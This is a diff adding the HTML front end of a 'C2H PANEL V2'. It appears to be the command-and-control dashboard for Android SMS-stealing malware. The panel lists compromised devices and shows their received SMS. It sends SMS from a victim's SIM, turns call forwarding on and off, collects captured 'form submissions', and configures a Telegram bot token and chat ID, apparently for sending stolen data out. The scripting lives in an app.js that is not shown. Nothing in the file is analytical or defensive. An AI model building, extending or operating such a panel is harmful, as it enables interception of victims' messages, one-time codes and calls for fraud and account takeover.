@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2H PANEL V2</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Hidden class for SPA navigation */
+        .hidden { display: none !important; }
+        
+        /* Empty state styles from forms.html */
+        .forms-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 70vh;
+            color: #ddd;
+            text-align: center;
+        }
+        .empty-icon {
+            font-size: 20px;
+            margin-right: 8px;
+        }
+        .empty-text-main {
+            font-size: 16px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+        }
+        .empty-text-sub {
+            font-size: 15px;
+        }
+    </style>
+</head>
+<body>
+    
+    <!-- ==================== VIEW 1: MAIN DASHBOARD ==================== -->
+    <div id="view-dashboard" class="spa-view">
+        <header class="main-header">
+            <h1>C2H 🔥 PANEL 🔥 V2</h1>
+            <i class="fa-solid fa-power-off power-icon"></i>
+        </header>
+
+        <div class="action-buttons">
+            <button id="btn-update-forwarding" class="gradient-btn fw-btn">UPDATE FORWARDING</button>
+            <button id="btn-update-telegram" class="gradient-btn telegram-btn">UPDATE TELEGRAM</button>
+        </div>
+
+        <main id="device-list" class="device-list">
+            <!-- Devices will be injected here via JS -->
+        </main>
+    </div>
+
+    <!-- ==================== VIEW 2: DEVICE DETAILS / SMS ==================== -->
+    <div id="view-device" class="spa-view hidden">
+        <header class="main-header device-header">
+            <i class="fa-solid fa-arrow-left back-btn" onclick="navigateTo('dashboard')"></i>
+            <h2>Device Control</h2>
+            <span class="status-dot online"></span>
+        </header>
+
+        <div class="controlling-info">
+            <i class="fa-solid fa-mobile-screen"></i> Controlling: <span id="current-device-id">...</span>
+        </div>
+
+        <div class="device-actions">
+            <button class="gradient-btn telegram-btn" id="btn-get-forms" onclick="navigateTo('forms')">GET FORMS</button>
+            <button class="gradient-btn telegram-btn" onclick="openModal('sms-modal')">SEND SMS</button>
+        </div>
+        <div class="device-actions-full">
+            <button class="gradient-btn full-btn update-btn" onclick="openModal('forwarding-device-modal')">CALL FORWARDING</button>
+        </div>
+
+        <h3 class="section-title">Received SMS</h3>
+        <main id="sms-list" class="sms-list">
+            <!-- SMS will be injected here via JS -->
+        </main>
+    </div>
+
+    <!-- ==================== VIEW 3: FORMS ==================== -->
+    <div id="view-forms" class="spa-view hidden">
+        <header class="main-header device-header">
+            <i class="fa-solid fa-arrow-left back-btn" id="forms-back-btn" onclick="navigateTo('device', currentDeviceId)"></i>
+            <h2>📋 Form Submissions</h2>
+        </header>
+
+        <div class="forms-container" id="forms-content">
+            <!-- Will be populated if any forms exist, otherwise shows empty state -->
+            <div class="empty-state">
+                <div class="empty-text-main">
+                    <span class="empty-icon">📭</span> No form submissions found
+                </div>
+                <div class="empty-text-sub">
+                    Submit forms from user app first
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- ==================== MODALS ==================== -->
+    <!-- Telegram Modal -->
+    <div id="telegram-modal" class="modal">
+        <div class="modal-content">
+            <h2>Update Telegram Details</h2>
+            <div class="input-group">
+                <input type="text" id="tg-token" placeholder="Bot Token">
+            </div>
+            <div class="input-group">
+                <input type="text" id="tg-chat-id" placeholder="Chat ID">
+            </div>
+            <div class="modal-actions">
+                <button class="gradient-btn cancel-btn" onclick="closeModal('telegram-modal')">CANCEL</button>
+                <button class="gradient-btn telegram-btn" id="save-telegram-btn">UPDATE</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Forwarding Modal -->
+    <div id="forwarding-modal" class="modal">
+        <div class="modal-content">
+            <h2>Update Forwarding Number</h2>
+            <div class="input-group">
+                <input type="text" id="fw-number" placeholder="Forwarding Number">
+            </div>
+            <div class="modal-actions">
+                <button class="gradient-btn cancel-btn" onclick="closeModal('forwarding-modal')">CANCEL</button>
+                <button class="gradient-btn update-btn" id="save-forwarding-btn">UPDATE</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Send SMS Modal -->
+    <div id="sms-modal" class="modal">
+        <div class="modal-content sms-modal-content">
+            <h2>Send SMS Command</h2>
+            <div class="input-group">
+                <input type="text" id="sms-phone" placeholder="Phone Number">
+            </div>
+            <div class="input-group">
+                <textarea id="sms-body" placeholder="SMS Message" rows="4"></textarea>
+            </div>
+            <div class="radio-group">
+                <label>
+                    <input type="radio" name="sms-sim" value="sim1" checked> 
+                    <span>SIM 1</span>
+                </label>
+                <label>
+                    <input type="radio" name="sms-sim" value="sim2"> 
+                    <span>SIM 2</span>
+                </label>
+            </div>
+            <div class="modal-actions-full">
+                <button class="gradient-btn telegram-btn full-btn" id="send-sms-btn">SEND SMS</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Call Forwarding Modal -->
+    <div id="forwarding-device-modal" class="modal">
+        <div class="modal-content sms-modal-content">
+            <h2>Call Forwarding</h2>
+            <div class="input-group">
+                <input type="text" id="dev-fw-number" placeholder="Forwarding Number">
+            </div>
+            <div class="radio-group">
+                <label>
+                    <input type="radio" name="fw-sim" value="sim1" checked> 
+                    <span>SIM 1</span>
+                </label>
+                <label>
+                    <input type="radio" name="fw-sim" value="sim2"> 
+                    <span>SIM 2</span>
+                </label>
+            </div>
+            <div class="modal-actions-full">
+                <button class="gradient-btn telegram-btn full-btn" id="activate-fw-btn">ACTIVATE</button>
+                <button class="gradient-btn telegram-btn full-btn" id="deactivate-fw-btn">DEACTIVATE</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
